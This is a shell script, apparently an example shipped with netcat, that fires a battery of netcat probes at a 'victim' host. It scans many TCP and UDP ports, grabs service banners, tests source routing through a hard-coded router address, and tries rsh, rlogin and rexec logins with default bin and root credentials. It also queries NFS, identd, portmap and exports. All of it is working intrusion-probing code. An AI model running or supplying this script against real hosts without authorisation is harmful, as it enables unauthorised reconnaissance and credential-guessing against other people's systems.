#! /bin/sh
## launch a whole buncha shit at yon victim in no particular order; capture
## stderr+stdout in one place.  Run as root for rservice and low -p to work.
## Fairly thorough example of using netcat to collect a lot of host info.
## Will set off every intrusion alarm in existence on a paranoid machine!

# where .d files are kept; "." if nothing else
DDIR=../data
# address of some well-connected router that groks LSRR
GATE=192.157.69.11

# might conceivably wanna change this for different run styles
UCMD='nc -v -w 8'

test ! "$1" && echo Needs victim arg && exit 1

echo '' | $UCMD -w 9 -r "$1" 13 79 6667 2>&1
echo '0' | $UCMD "$1" 79 2>&1
# if LSRR was passed thru, should get refusal here:
$UCMD -z -r -g $GATE "$1" 6473 2>&1
$UCMD -r -z "$1" 6000 4000-4004 111 53 2105 137-140 1-20 540-550 95 87 2>&1
# -s `hostname` may be wrong for some multihomed machines
echo 'UDP echoecho!' | nc -u -p 7 -s `hostname` -w 3 "$1" 7 19 2>&1
echo '113,10158' | $UCMD -p 10158 "$1" 113 2>&1
rservice bin bin | $UCMD -p 1019 "$1" shell 2>&1
echo QUIT | $UCMD -w 8 -r "$1" 25 158 159 119 110 109 1109 142-144 220 23 2>&1
# newline after any telnet trash
echo ''
echo PASV | $UCMD -r "$1" 21 2>&1
echo 'GET /' | $UCMD -w 10 "$1" 80 81 210 70 2>&1
# sometimes contains useful directory info:
echo 'GET /robots.txt' | $UCMD -w 10 "$1" 80 2>&1
# now the big red lights go on
rservice bin bin 9600/9600 | $UCMD -p 1020 "$1" login 2>&1
rservice root root | $UCMD -r "$1" exec 2>&1
echo 'BEGIN big udp -- everything may look "open" if packet-filtered'
data -g < ${DDIR}/nfs-0.d | $UCMD -i 1 -u "$1" 2049 | od -x 2>&1
# no wait-time, uses RTT hack
nc -v -z -u -r "$1" 111 66-70 88 53 87 161-164 121-123 213 49 2>&1
nc -v -z -u -r "$1" 137-140 694-712 747-770 175-180 2103 510-530 2>&1
echo 'END big udp'
$UCMD -r -z "$1" 175-180 2000-2003 530-533 1524 1525 666 213 8000 6250 2>&1
# Use our identd-sniffer!
iscan "$1" 21 25 79 80 111 53 6667 6000 2049 119 2>&1
# this gets pretty intrusive, but what the fuck.  Probe for portmap first
if nc -w 5 -z -u "$1" 111 ; then
  showmount -e "$1" 2>&1
  rpcinfo -p "$1" 2>&1
fi
exit 0
